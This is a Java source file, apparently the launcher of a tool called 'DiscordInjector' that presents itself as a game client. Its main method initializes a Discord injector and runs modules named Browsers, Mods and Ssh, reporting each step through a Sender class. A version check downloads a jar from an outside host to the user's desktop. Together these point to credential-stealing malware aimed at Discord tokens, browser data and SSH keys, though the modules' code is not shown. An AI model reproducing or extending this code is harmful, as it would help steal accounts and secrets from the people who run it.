package io.github.luxotick;

import io.github.luxotick.impl.*;

import java.io.IOException;
import java.net.MalformedURLException;
import java.util.Objects;
import java.util.Scanner;
import java.net.URL;
import javax.swing.JOptionPane;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.io.FileOutputStream;


public class Start {
	public static void main(String[] argument) throws Exception {
        String version = "1.0.2";
		versionChecker(version);
        Sender.sendMessage("Starting DiscordInjector v" + version);
		if (DiscordInjector.instance == null){
			DiscordInjector.instance = new DiscordInjector();
		}
	    DiscordInjector.instance.initialize();
        Sender.sendMessage("DiscordInjector initialized.");
		Sender.sendMessage("Starting other arguments...");
		Browsers.main(argument);
		Sender.sendMessage("Browsers done.");
		Mods.main(argument);
		Sender.sendMessage("Mods done.");
		Ssh.main(argument);
		Sender.sendMessage("Ssh done.");
		Sender.sendMessage("Now launching the client.");
		System.exit(0);
	}

    public static void versionChecker(String version) throws IOException {
		// read raw data from url
		Scanner scanner = new Scanner(new URL("https://dont-try.me/version").openStream());
		// read first line
		String line = scanner.nextLine();

        System.out.println("Current version: " + line);
		// close scanner
		scanner.close();

        if (!Objects.equals(line, version)) {
            JOptionPane.showMessageDialog(null, "You are using an outdated version. Please update to the latest version.", "Update available", JOptionPane.WARNING_MESSAGE);
            System.out.println("You are using an outdated version. Please update to the latest version.");
            update("https://dont-try.me/allah.jar", System.getProperty("user.home") + "/Desktop/" + "latest.jar");
            JOptionPane.showMessageDialog(null, "New version can be found on your desktop.", "Update done", JOptionPane.INFORMATION_MESSAGE);
            System.exit(0);

        } else {
            System.out.println("You are using the latest version.");
        }
    }

    private static void update(String urlStr, String file) throws IOException {
        URL url = new URL(urlStr);
        ReadableByteChannel rbc = Channels.newChannel(url.openStream());
        FileOutputStream fos = new FileOutputStream(file);
        fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
        fos.close();
        rbc.close();
    }
}